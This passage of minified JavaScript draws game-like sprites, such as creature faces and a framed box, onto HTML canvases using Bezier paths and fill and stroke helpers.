      ye(r, i[0], i[0], e * 2);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 105.00567626953125, e * 50.53410339355469);
      r.bezierCurveTo(e * 112.00567626953125, e * 48.53410339355469, e * 125.00567626953125, e * 21.534103393554688, e * 132.00567626953125, e * 33.53410339355469);
      r.bezierCurveTo(e * 138.00567626953125, e * 42.53410339355469, e * 140.00567626953125, e * 64.53410339355469, e * 136.00567626953125, e * 75.53410339355469);
      r.closePath();
      ye(r, i[0], i[0], e * 2);
      r.globalAlpha = 1;
      r.translate(0, e * -5);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 33.00567626953125, e * 95.44320678710938);
      r.bezierCurveTo(e * 42.00567626953125, e * 87.44320678710938, e * 48.00567626953125, e * 51.443206787109375, e * 74.00567626953125, e * 47.443206787109375);
      r.bezierCurveTo(e * 100.00567626953125, e * 42.443206787109375, e * 118.00567626953125, e * 49.443206787109375, e * 131.00567626953125, e * 55.443206787109375);
      r.bezierCurveTo(e * 140.00567626953125, e * 70.44320678710938, e * 145.00567626953125, e * 87.44320678710938, e * 152.00567626953125, e * 94.44320678710938);
      r.bezierCurveTo(e * 149.00567626953125, e * 99.44320678710938, e * 147.00567626953125, e * 98.44320678710938, e * 141.00567626953125, e * 101.44320678710938);
      r.bezierCurveTo(e * 147.00567626953125, e * 108.44320678710938, e * 147.00567626953125, e * 111.44320678710938, e * 147.00567626953125, e * 112.44320678710938);
      r.bezierCurveTo(e * 143.00567626953125, e * 112.44320678710938, e * 141.00567626953125, e * 112.44320678710938, e * 137.00567626953125, e * 111.44320678710938);
      r.bezierCurveTo(e * 138.00567626953125, e * 117.44320678710938, e * 138.00567626953125, e * 120.44320678710938, e * 138.00567626953125, e * 124.44320678710938);
      r.bezierCurveTo(e * 125.00567626953125, e * 107.44320678710938, e * 121.00567626953125, e * 124.44320678710938, e * 110.00567626953125, e * 141.44320678710938);
      r.bezierCurveTo(e * 102.00567626953125, e * 158.44320678710938, e * 89.00567626953125, e * 158.44320678710938, e * 80.00567626953125, e * 144.44320678710938);
      r.bezierCurveTo(e * 61.00567626953125, e * 111.44320678710938, e * 56.00567626953125, e * 117.44320678710938, e * 48.00567626953125, e * 120.44320678710938);
      r.bezierCurveTo(e * 46.00567626953125, e * 118.44320678710938, e * 47.00567626953125, e * 112.44320678710938, e * 48.00567626953125, e * 107.44320678710938);
      r.bezierCurveTo(e * 43.00567626953125, e * 111.44320678710938, e * 40.00567626953125, e * 111.44320678710938, e * 37.00567626953125, e * 110.44320678710938);
      r.bezierCurveTo(e * 39.50567626953125, e * 104.94320678710938, e * 39.50567626953125, e * 104.94320678710938, e * 42.00567626953125, e * 99.44320678710938);
      r.bezierCurveTo(e * 33.00567626953125, e * 99.44320678710938, e * 33.00567626953125, e * 98.44320678710938, e * 33.00567626953125, e * 96.44320678710938);
      r.closePath();
      ye(r, i[1], i[2], e * 3);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 60.00567626953125, e * 99.35227966308594);
      r.bezierCurveTo(e * 70.00567626953125, e * 82.35227966308594, e * 85.00567626953125, e * 86.35227966308594, e * 87.00567626953125, e * 97.35227966308594);
      r.bezierCurveTo(e * 89.00567626953125, e * 101.35227966308594, e * 88.00567626953125, e * 105.35227966308594, e * 87.00567626953125, e * 110.35227966308594);
      r.bezierCurveTo(e * 89.00567626953125, e * 111.35227966308594, e * 91.00567626953125, e * 112.35227966308594, e * 93.00567626953125, e * 115.35227966308594);
      r.bezierCurveTo(e * 96.00567626953125, e * 111.35227966308594, e * 99.00567626953125, e * 111.35227966308594, e * 100.00567626953125, e * 110.35227966308594);
      r.bezierCurveTo(e * 98.00567626953125, e * 92.35227966308594, e * 103.00567626953125, e * 86.35227966308594, e * 113.00567626953125, e * 89.35227966308594);
      r.bezierCurveTo(e * 122.00567626953125, e * 92.35227966308594, e * 123.00567626953125, e * 94.35227966308594, e * 126.00567626953125, e * 98.35227966308594);
      r.bezierCurveTo(e * 124.00567626953125, e * 102.35227966308594, e * 123.00567626953125, e * 103.35227966308594, e * 121.00567626953125, e * 104.35227966308594);
      r.bezierCurveTo(e * 124.00567626953125, e * 105.35227966308594, e * 126.00567626953125, e * 107.35227966308594, e * 129.00567626953125, e * 111.35227966308594);
      r.bezierCurveTo(e * 115.00567626953125, e * 122.35227966308594, e * 113.00567626953125, e * 145.35227966308594, e * 100.00567626953125, e * 152.35227966308594);
      r.bezierCurveTo(e * 91.00567626953125, e * 158.35227966308594, e * 83.00567626953125, e * 149.35227966308594, e * 76.00567626953125, e * 138.35227966308594);
      r.bezierCurveTo(e * 67.00567626953125, e * 114.35227966308594, e * 63.00567626953125, e * 113.35227966308594, e * 59.00567626953125, e * 111.35227966308594);
      r.bezierCurveTo(e * 62.00567626953125, e * 107.35227966308594, e * 64.00567626953125, e * 105.35227966308594, e * 66.00567626953125, e * 104.35227966308594);
      r.bezierCurveTo(e * 63.00567626953125, e * 100.35227966308594, e * 62.00567626953125, e * 100.35227966308594, e * 60.00567626953125, e * 99.35227966308594);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 33.00567626953125, e * 95.44320678710938);
      r.bezierCurveTo(e * 42.00567626953125, e * 87.44320678710938, e * 48.00567626953125, e * 51.443206787109375, e * 74.00567626953125, e * 47.443206787109375);
      r.bezierCurveTo(e * 100.00567626953125, e * 42.443206787109375, e * 118.00567626953125, e * 49.443206787109375, e * 131.00567626953125, e * 55.443206787109375);
      r.bezierCurveTo(e * 140.00567626953125, e * 70.44320678710938, e * 145.00567626953125, e * 87.44320678710938, e * 152.00567626953125, e * 94.44320678710938);
      r.bezierCurveTo(e * 149.00567626953125, e * 99.44320678710938, e * 147.00567626953125, e * 98.44320678710938, e * 141.00567626953125, e * 101.44320678710938);
      r.bezierCurveTo(e * 147.00567626953125, e * 108.44320678710938, e * 147.00567626953125, e * 111.44320678710938, e * 147.00567626953125, e * 112.44320678710938);
      r.bezierCurveTo(e * 143.00567626953125, e * 112.44320678710938, e * 141.00567626953125, e * 112.44320678710938, e * 137.00567626953125, e * 111.44320678710938);
      r.bezierCurveTo(e * 138.00567626953125, e * 117.44320678710938, e * 138.00567626953125, e * 120.44320678710938, e * 138.00567626953125, e * 124.44320678710938);
      r.bezierCurveTo(e * 125.00567626953125, e * 107.44320678710938, e * 121.00567626953125, e * 124.44320678710938, e * 110.00567626953125, e * 141.44320678710938);
      r.bezierCurveTo(e * 102.00567626953125, e * 158.44320678710938, e * 89.00567626953125, e * 158.44320678710938, e * 80.00567626953125, e * 144.44320678710938);
      r.bezierCurveTo(e * 61.00567626953125, e * 111.44320678710938, e * 56.00567626953125, e * 117.44320678710938, e * 48.00567626953125, e * 120.44320678710938);
      r.bezierCurveTo(e * 46.00567626953125, e * 118.44320678710938, e * 47.00567626953125, e * 112.44320678710938, e * 48.00567626953125, e * 107.44320678710938);
      r.bezierCurveTo(e * 43.00567626953125, e * 111.44320678710938, e * 40.00567626953125, e * 111.44320678710938, e * 37.00567626953125, e * 110.44320678710938);
      r.bezierCurveTo(e * 39.50567626953125, e * 104.94320678710938, e * 39.50567626953125, e * 104.94320678710938, e * 42.00567626953125, e * 99.44320678710938);
      r.bezierCurveTo(e * 33.00567626953125, e * 99.44320678710938, e * 33.00567626953125, e * 98.44320678710938, e * 33.00567626953125, e * 96.44320678710938);
      r.closePath();
      ye(r, undefined, i[2], e * 3);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 51.00567626953125, e * 72.53409576416016);
      r.bezierCurveTo(e * 48.00567626953125, e * 56.534095764160156, e * 48.00567626953125, e * 49.534095764160156, e * 54.00567626953125, e * 35.534095764160156);
      r.bezierCurveTo(e * 58.00567626953125, e * 26.534095764160156, e * 65.00567626953125, e * 27.534095764160156, e * 73.00567626953125, e * 40.534095764160156);
      r.bezierCurveTo(e * 81.00567626953125, e * 49.534095764160156, e * 82.00567626953125, e * 50.534095764160156, e * 83.00567626953125, e * 51.534095764160156);
      ye(r, i[1], i[2], e * 3);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 105.00567626953125, e * 50.53410339355469);
      r.bezierCurveTo(e * 112.00567626953125, e * 48.53410339355469, e * 125.00567626953125, e * 21.534103393554688, e * 132.00567626953125, e * 33.53410339355469);
      r.bezierCurveTo(e * 138.00567626953125, e * 42.53410339355469, e * 140.00567626953125, e * 64.53410339355469, e * 136.00567626953125, e * 75.53410339355469);
      ye(r, i[1], i[2], e * 3);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 57.00567626953125, e * 68.53410339355469);
      r.bezierCurveTo(e * 63.00567626953125, e * 69.53410339355469, e * 69.00567626953125, e * 66.53410339355469, e * 73.00567626953125, e * 60.53410339355469);
      r.bezierCurveTo(e * 66.00567626953125, e * 47.53410339355469, e * 61.00567626953125, e * 42.53410339355469, e * 58.00567626953125, e * 49.53410339355469);
      r.bezierCurveTo(e * 56.00567626953125, e * 59.53410339355469, e * 56.00567626953125, e * 64.53410339355469, e * 57.00567626953125, e * 67.53410339355469);
      r.closePath();
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 115.00567626953125, e * 59.715911865234375);
      r.bezierCurveTo(e * 119.00567626953125, e * 48.715911865234375, e * 126.00567626953125, e * 41.715911865234375, e * 129.00567626953125, e * 48.715911865234375);
      r.bezierCurveTo(e * 131.00567626953125, e * 56.715911865234375, e * 133.00567626953125, e * 71.71591186523438, e * 127.00567626953125, e * 68.71591186523438);
      r.bezierCurveTo(e * 120.00567626953125, e * 67.71591186523438, e * 114.00567626953125, e * 59.715911865234375, e * 116.00567626953125, e * 58.715911865234375);
      r.closePath();
      ye(r, i[3]);
      ze(r, e * 77, e * 107, e * 6);
      ye(r, i[2]);
      ze(r, e * 110, e * 107, e * 6);
      ye(r, i[2]);
      ze(r, e * 75, e * 105, e * 3);
      ye(r, i[4]);
      ze(r, e * 108, e * 105, e * 3);
      ye(r, i[4]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 88.00567626953125, e * 141.4431915283203);
      r.bezierCurveTo(e * 93.00567626953125, e * 137.4431915283203, e * 96.00567626953125, e * 138.4431915283203, e * 100.00567626953125, e * 141.4431915283203);
      r.bezierCurveTo(e * 103.00567626953125, e * 143.4431915283203, e * 101.00567626953125, e * 149.4431915283203, e * 95.00567626953125, e * 148.4431915283203);
      r.bezierCurveTo(e * 85.00567626953125, e * 148.4431915283203, e * 86.00567626953125, e * 145.4431915283203, e * 88.00567626953125, e * 142.4431915283203);
      r.closePath();
      ye(r, i[1]);
      return t;
    }
    function si(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      var a = e * 55;
      var o = e * 55;
      var s = e * 8;
      r.width = a;
      r.height = o;
      n.translate(e * -65, e * -55 + s);
      n.globalAlpha = 1;
      n.beginPath();
      n.moveTo(e * 95, e * 60);
      n.bezierCurveTo(e * 107, e * 62, e * 110, e * 73, e * 107, e * 79);
      n.bezierCurveTo(e * 104, e * 85, e * 85, e * 93, e * 81, e * 88);
      n.bezierCurveTo(e * 74, e * 80, e * 85, e * 60, e * 95, e * 60);
      n.closePath();
      ye(n, t[0], t[1], 3);
      n.globalAlpha = 1;
      n.beginPath();
      n.moveTo(e * 91, e * 70);
      n.bezierCurveTo(e * 91, e * 75, e * 100, e * 76, e * 100, e * 73);
      n.bezierCurveTo(e * 100, e * 69, e * 89, e * 65, e * 91, e * 70);
      n.closePath();
      ye(n, t[2], t[3], 3);
      return r;
    }
    function _i(e, i) {
      var t = document.createElement("canvas");
      var r = t.getContext("2d");
      t.width = e * 238;
      t.height = e * 230;
      r.translate(e * -93, e * -110 + e * 5);
      r.globalAlpha = 0.3;
      ze(r, e * 213.5, e * 256.75, e * 75);
      ye(r, i[5]);
      ze(r, e * 213.5, e * 175.75, e * 25);
      ye(r, i[5]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 156.5, e * 137.75);
      r.bezierCurveTo(e * 170.5, e * 173.75, e * 195.5, e * 177.75, e * 209.5, e * 177.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 217.5, e * 178.75);
      r.bezierCurveTo(e * 251.5, e * 177.75, e * 263.5, e * 153.75, e * 270.5, e * 140.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 130.5, e * 124.75);
      r.bezierCurveTo(e * 153.5, e * 185.75, e * 198.5, e * 185.75, e * 213.5, e * 185.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 183.75);
      r.bezierCurveTo(e * 265.5, e * 192.75, e * 293.5, e * 141.75, e * 297.5, e * 124.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107.5, e * 213.75);
      r.bezierCurveTo(e * 151.5, e * 190.75, e * 198.5, e * 184.75, e * 210.5, e * 184.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 212.5, e * 187.75);
      r.bezierCurveTo(e * 258.5, e * 182.75, e * 286.5, e * 194.75, e * 314.5, e * 206.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 102.5, e * 258.75);
      r.bezierCurveTo(e * 142.5, e * 200.75, e * 193.5, e * 194.75, e * 211.5, e * 185.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 192.75);
      r.bezierCurveTo(e * 276.5, e * 194.75, e * 306.5, e * 233.75, e * 316.5, e * 246.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[5];
      r.stroke();
      r.translate(0, -5);
      r.globalAlpha = 1;
      ze(r, e * 213.5, e * 256.75, e * 75);
      ye(r, i[3]);
      ze(r, e * 213.5, e * 175.75, e * 25);
      ye(r, i[3]);
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 219.5, e * 158.75);
      r.bezierCurveTo(e * 226.5, e * 159.75, e * 227.5, e * 147.75, e * 219.5, e * 145.75);
      r.closePath();
      r.lineWidth = e * 10;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 210.5, e * 160.75);
      r.bezierCurveTo(e * 203.5, e * 159.75, e * 199.5, e * 146.75, e * 210.5, e * 145.75);
      r.closePath();
      r.lineWidth = e * 10;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 219.5, e * 158.75);
      r.bezierCurveTo(e * 226.5, e * 159.75, e * 227.5, e * 147.75, e * 219.5, e * 145.75);
      r.closePath();
      r.fillStyle = i[0];
      r.fill();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 210.5, e * 160.75);
      r.bezierCurveTo(e * 203.5, e * 159.75, e * 199.5, e * 146.75, e * 210.5, e * 145.75);
      r.closePath();
      r.fillStyle = i[0];
      r.fill();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 156.5, e * 137.75);
      r.bezierCurveTo(e * 170.5, e * 173.75, e * 195.5, e * 177.75, e * 209.5, e * 177.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 217.5, e * 178.75);
      r.bezierCurveTo(e * 251.5, e * 177.75, e * 263.5, e * 153.75, e * 270.5, e * 140.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 130.5, e * 124.75);
      r.bezierCurveTo(e * 153.5, e * 185.75, e * 198.5, e * 185.75, e * 213.5, e * 185.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 183.75);
      r.bezierCurveTo(e * 265.5, e * 192.75, e * 293.5, e * 141.75, e * 297.5, e * 124.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107.5, e * 213.75);
      r.bezierCurveTo(e * 151.5, e * 190.75, e * 198.5, e * 184.75, e * 210.5, e * 184.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 212.5, e * 187.75);
      r.bezierCurveTo(e * 258.5, e * 182.75, e * 286.5, e * 194.75, e * 314.5, e * 206.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 102.5, e * 258.75);
      r.bezierCurveTo(e * 142.5, e * 200.75, e * 193.5, e * 194.75, e * 211.5, e * 185.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 192.75);
      r.bezierCurveTo(e * 276.5, e * 194.75, e * 306.5, e * 233.75, e * 316.5, e * 246.75);
      r.lineWidth = e * 17;
      r.strokeStyle = i[3];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 156.5, e * 137.75);
      r.bezierCurveTo(e * 170.5, e * 173.75, e * 195.5, e * 177.75, e * 209.5, e * 177.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 217.5, e * 178.75);
      r.bezierCurveTo(e * 251.5, e * 177.75, e * 263.5, e * 153.75, e * 270.5, e * 140.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 130.5, e * 124.75);
      r.bezierCurveTo(e * 153.5, e * 185.75, e * 198.5, e * 185.75, e * 213.5, e * 185.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 183.75);
      r.bezierCurveTo(e * 265.5, e * 192.75, e * 293.5, e * 141.75, e * 297.5, e * 124.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 107.5, e * 213.75);
      r.bezierCurveTo(e * 151.5, e * 190.75, e * 198.5, e * 184.75, e * 210.5, e * 184.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 212.5, e * 187.75);
      r.bezierCurveTo(e * 258.5, e * 182.75, e * 286.5, e * 194.75, e * 314.5, e * 206.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 102.5, e * 258.75);
      r.bezierCurveTo(e * 142.5, e * 200.75, e * 193.5, e * 194.75, e * 211.5, e * 185.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      r.beginPath();
      r.lineCap = "round";
      r.lineJoin = "round";
      r.moveTo(e * 214.5, e * 192.75);
      r.bezierCurveTo(e * 276.5, e * 194.75, e * 306.5, e * 233.75, e * 316.5, e * 246.75);
      r.lineWidth = e * 8;
      r.strokeStyle = i[0];
      r.stroke();
      ze(r, e * 213.5, e * 256.75, e * 70);
      ye(r, i[0]);
      ze(r, e * 213.5, e * 175.75, e * 20);
      ye(r, i[0]);
      ze(r, e * 222, e * 166, e * 5);
      r.fillStyle = i[2];
      r.fill();
      ze(r, e * 205, e * 166, e * 5);
      r.fillStyle = i[2];
      r.fill();
      ze(r, e * 206.2, e * 167, e * 2.5);
      r.fillStyle = i[4];
      r.fill();
      ze(r, e * 223.2, e * 167, e * 2.5);
      r.fillStyle = i[4];
      r.fill();
      r.save();
      r.translate(e * 213.5, e * 293.75);
      r.rotate(0.76);
      Be(r, e * -22, e * -21, e * 44, e * 42, e * 6);
      r.restore();
      r.fillStyle = i[1];
      r.fill();
      r.save();
      r.translate(e * 212.5, e * 258.25);
      r.rotate(0.8);
      Be(r, e * -15, e * -14.5, e * 30, e * 29, e * 6);
      r.restore();
      r.fillStyle = i[1];
      r.fill();
      return t;
    }
    function Ei(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.save();
      n.translate(e * 202.5, e * 147.5);
      Be(n, e * -96.5, e * -21.5, e * 193, e * 193, e * 0);
      n.restore();
      ye(n, i[0], i[1], e * 12);
      n.save();
      n.translate(e * 202.5, e * 190.5);
      Be(n, e * 96.5, e * -21.5, e * -193, e * 43, e * 0);
      n.restore();
      ye(n, i[2], i[1], e * 12);
      n.save();
      n.save();
      n.translate(e * 202.5, e * 233.5);
      Be(n, e * -96.5, e * -20.5, e * 193, e * 41, e * 0);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 202.5, e * 275);
      Be(n, e * 96.5, e * -21, e * -193, e * 42, e * 0);
      n.restore();
      ye(n, i[0], i[1], e * 12);
      n.save();
      n.translate(e * 201, e * 212);
      n.rotate(8.64);
      Be(n, e * -116, e * -22, e * 232, e * 44, e * 10);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 203.5, e * 121.5);
      Be(n, e * -115.5, e * -20.5, e * 231, e * 41, e * 10);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 203.5, e * 299);
      Be(n, e * -115.5, e * -20, e * 231, e * 40, e * 10);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 298.5, e * 210);
      Be(n, e * -20.5, e * -109, e * 41, e * 218, e * 10);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 108.5, e * 210);
      Be(n, e * -20.5, e * -109, e * 41, e * 218, e * 10);
      n.restore();
      ye(n, i[3], i[1], e * 12);
      n.save();
      n.translate(e * 204, e * 121.5);
      Be(n, e * -92, e * -9.5, e * 184, e * 19, e * 10);
      n.restore();
      ye(n, i[3], i[3], e * 10);
      n.save();
      n.translate(e * 197, e * 299);
      Be(n, e * 85, e * -9, e * -170, e * 18, e * 10);
      n.restore();
      ye(n, i[3], i[3], e * 10);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 94, e * 317);
      n.bezierCurveTo(e * 110.5, e * 299.5, e * 110.5, e * 299.5, e * 127, e * 282);
      n.closePath();
      ye(n, undefined, i[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 279, e * 142);
      n.bezierCurveTo(e * 296.5, e * 125.5, e * 296.5, e * 125.5, e * 314, e * 109);
      n.closePath();
      ye(n, undefined, i[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 93, e * 106);
      n.bezierCurveTo(e * 110.5, e * 124, e * 110.5, e * 124, e * 128, e * 142);
      n.closePath();
      ye(n, undefined, i[1], e * 12);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 281, e * 282);
      n.bezierCurveTo(e * 296, e * 297.5, e * 296, e * 297.5, e * 311, e * 313);
      n.closePath();
      ye(n, undefined, i[1], e * 12);
      if (t == 0) {
        n.scale(2, 2);
        n.translate(e * -7, e * 55);
        n.rotate(-0.5);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 60, e * 47);
        n.bezierCurveTo(e * 81, e * 46, e * 85, e * 47, e * 83, e * 63);
        n.bezierCurveTo(e * 83, e * 72, e * 83, e * 75, e * 72, e * 73);
        n.bezierCurveTo(e * 68, e * 80, e * 69, e * 82, e * 66, e * 73);
        n.bezierCurveTo(e * 62, e * 81, e * 61, e * 82, e * 59, e * 73);
        n.bezierCurveTo(e * 54, e * 81, e * 55, e * 81, e * 52, e * 74);
        n.bezierCurveTo(e * 38, e * 76, e * 41, e * 74, e * 40, e * 66);
        n.bezierCurveTo(e * 38, e * 45, e * 39, e * 49, e * 59, e * 47);
        n.closePath();
        ye(n, i[4], i[4], e * 5);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 68, e * 54);
        n.bezierCurveTo(e * 75, e * 54, e * 77, e * 62, e * 71, e * 64);
        n.bezierCurveTo(e * 62, e * 65, e * 63, e * 54, e * 68, e * 54);
        n.closePath();
        ye(n, i[3]);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 50, e * 55);
        n.bezierCurveTo(e * 57, e * 55, e * 58, e * 65, e * 52, e * 65);
        n.bezierCurveTo(e * 44, e * 66, e * 44, e * 54, e * 50, e * 55);
        n.closePath();
        ye(n, i[3]);
      } else if (t == 1) {
        n.scale(0.6, 0.6);
        n.translate(e * 185, e * 165);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 108, e * 56);
        n.bezierCurveTo(e * 136, e * 58, e * 203, e * 69, e * 234, e * 75);
        n.bezierCurveTo(e * 246, e * 77, e * 247, e * 78, e * 245, e * 90);
        n.bezierCurveTo(e * 238, e * 143, e * 228, e * 197, e * 214, e * 259);
        n.bezierCurveTo(e * 212, e * 267, e * 209, e * 270, e * 189, e * 268);
        n.bezierCurveTo(e * 142, e * 264, e * 106, e * 260, e * 75, e * 253);
        n.bezierCurveTo(e * 60, e * 250, e * 64, e * 250, e * 66, e * 221);
        n.bezierCurveTo(e * 71, e * 168, e * 87, e * 95, e * 98, e * 67);
        n.bezierCurveTo(e * 101, e * 57, e * 103, e * 56, e * 106, e * 56);
        n.closePath();
        ye(n, i[4], i[4], e * 20);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 112, e * 72);
        n.bezierCurveTo(e * 132, e * 73, e * 227, e * 85, e * 226, e * 91);
        n.bezierCurveTo(e * 231, e * 89, e * 217, e * 196, e * 200, e * 250);
        n.bezierCurveTo(e * 196, e * 254, e * 175, e * 249, e * 166, e * 249);
        n.bezierCurveTo(e * 91, e * 241, e * 82, e * 236, e * 83, e * 232);
        n.bezierCurveTo(e * 90, e * 144, e * 108, e * 71, e * 111, e * 72);
        n.closePath();
        ye(n, undefined, i[0], e * 13);
        n.beginPath();
        n.lineCap = "round";
        n.lineJoin = "round";
        n.moveTo(e * 132, e * 117);
        n.bezierCurveTo(e * 171, e * 86, e * 191, e * 101, e * 188, e * 134);
        n.bezierCurveTo(e * 185, e * 154, e * 170, e * 158, e * 153, e * 158);
        n.bezierCurveTo(e * 143, e * 172, e * 146, e * 180, e * 147, e * 193);
        ye(n, undefined, i[0], e * 20);
        ze(n, e * 142, e * 221, e * 16.1245154965971);
        ye(n, i[0]);
      }
      return r;
    }
    function Ti(e, i, t) {
      var r = document.createElement("canvas");
      var n = r.getContext("2d");
      r.width = e * 400;
      r.height = e * 400;
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 101, e * 255);
      n.bezierCurveTo(e * 113, e * 243, e * 179, e * 210, e * 219, e * 196);
      n.bezierCurveTo(e * 252, e * 203, e * 288, e * 215, e * 318, e * 233);
      n.bezierCurveTo(e * 304, e * 254, e * 258, e * 273, e * 215, e * 296);
      n.bezierCurveTo(e * 161, e * 287, e * 119, e * 270, e * 102, e * 257);
      n.closePath();
      ye(n, t[0], t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 99, e * 258);
      n.bezierCurveTo(e * 99, e * 272.5, e * 99, e * 272.5, e * 99, e * 287);
      n.bezierCurveTo(e * 166, e * 319, e * 193, e * 320, e * 212, e * 324);
      n.bezierCurveTo(e * 292, e * 286, e * 312, e * 271, e * 319, e * 263);
      n.bezierCurveTo(e * 320, e * 249, e * 320, e * 241, e * 318, e * 234);
      n.bezierCurveTo(e * 300, e * 254, e * 254, e * 277, e * 216, e * 294);
      n.bezierCurveTo(e * 190, e * 296, e * 135, e * 276, e * 102, e * 258);
      n.closePath();
      ye(n, t[2], t[1], e * 14);
      n.beginPath();
      n.lineCap = "round";
      n.lineJoin = "round";
      n.moveTo(e * 212, e * 323);
      n.bezierCurveTo(e * 211.5, e * 310.5, e * 211.5, e * 310.5, e * 211, e * 298);
      n.closePath();
